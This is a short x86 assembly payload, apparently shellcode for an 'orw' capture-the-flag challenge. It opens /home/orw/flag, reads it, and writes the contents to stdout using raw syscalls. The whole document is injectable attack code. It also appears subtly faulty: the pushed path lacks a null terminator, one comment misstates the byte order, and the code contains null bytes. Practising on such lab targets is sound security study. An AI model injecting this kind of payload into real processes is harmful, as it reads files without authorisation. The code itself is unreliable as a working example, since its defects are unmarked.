.section .text
.global _start

_start:
    # open("/home/orw/flag", O_RDONLY)
    push $0x67616c66      # "flag"
    push $0x2f77726f      # "/orw"
    push $0x2f656d6f      # "/ome"
    push $0x682f2f2f      # "h///"
    mov %esp, %ebx        # filename pointer
    mov $0, %ecx          # O_RDONLY
    mov $5, %eax          # sys_open
    int $0x80
    
    # read(fd, buffer, size)
    mov %eax, %ebx        # file descriptor from open
    mov %esp, %ecx        # buffer (use stack)
    sub $0x100, %ecx      # allocate buffer space
    mov $100, %edx        # read up to 100 bytes
    mov $3, %eax          # sys_read
    int $0x80
    
    # write(stdout, buffer, size)
    mov $1, %ebx          # stdout
    # ecx already points to buffer
    # edx already has size
    mov $4, %eax          # sys_write
    int $0x80
    
    # exit
    mov $1, %eax          # sys_exit
    mov $0, %ebx          # exit code
    int $0x80